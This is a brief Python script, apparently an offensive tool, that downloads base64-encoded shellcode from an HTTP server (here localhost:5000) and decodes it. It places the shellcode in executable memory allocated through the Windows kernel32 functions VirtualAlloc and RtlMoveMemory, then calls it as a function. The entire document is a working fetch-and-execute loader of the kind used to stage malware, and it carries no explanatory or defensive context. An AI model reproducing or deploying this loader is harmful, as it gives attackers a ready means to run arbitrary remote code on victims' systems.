import base64
import ctypes
import urllib.request

def writetomem(buff):
    buflength = len(buff)
    k32 = ctypes.windll.kernel32
    k32.VirtualAlloc.restype = ctypes.c_void_p
    hpoint = k32.VirtualAlloc(None,buflength,0x3000,0x40)
    k32.RtlMoveMemory.argtypes = (ctypes.c_void_p,ctypes.c_void_p,ctypes.c_size_t)
    k32.RtlMoveMemory(hpoint,buff,buflength)
    return hpoint


serveraddr = "http://localhost:5000/shellcode.bin"
response = urllib.request.urlopen(serveraddr)
fullresponse = response.read()
print(fullresponse)
decodeshell = base64.b64decode(fullresponse)
bufferholder = ctypes.create_string_buffer(decodeshell)
phold = writetomem(bufferholder)
shellfunc = ctypes.cast(phold,ctypes.CFUNCTYPE(None))
shellfunc()